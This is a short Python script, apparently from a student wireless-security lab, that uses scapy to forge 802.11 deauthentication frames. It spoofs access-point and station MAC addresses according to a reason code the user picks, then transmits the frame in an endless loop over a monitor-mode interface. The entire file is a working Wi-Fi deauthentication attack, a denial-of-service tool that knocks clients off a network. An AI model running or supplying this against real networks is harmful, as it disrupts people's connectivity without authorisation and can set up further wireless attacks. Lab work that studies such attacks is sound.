#!/usr/bin/env python3
# Julien Huguet & Antoine Hunkeler

from scapy.all import *

# interface name and MAC addresses
iface="wlan0mon"
src="e4:b3:18:ca:9e:a5"
dst="d2:35:88:45:75:85"
ap="d2:35:88:45:75:85"

# Ask user to choose the reason code
print("Reason code available : 1 - 4 - 5 - 8")
reasonCode = int(input("Choose the reason code : ")) 

# if reason code is 1, 4 or 5
# set the MAC source with the access point MAC address
# and the MAC destination with station MAC address
if reasonCode == 1 or reasonCode == 5 or reasonCode == 4:
	src="B2:E4:E4:70:CC:36"
	dst="e4:b3:18:ca:9e:a5"
# set the MAC source with the station MAC address
# and the MAC destination with access point MAC address
elif reasonCode == 8:
	src="e4:b3:18:ca:9e:a5"
	dst="B2:E4:E4:70:CC:36"

# forge a deauthentification frame depending of the entering reason code
pkt = RadioTap() / Dot11( addr1 = dst, addr2 = src, addr3 = ap) / Dot11Deauth(reason=reasonCode)

# send packet until interrupt
while True:
	sendp(pkt, iface=iface, count=1)
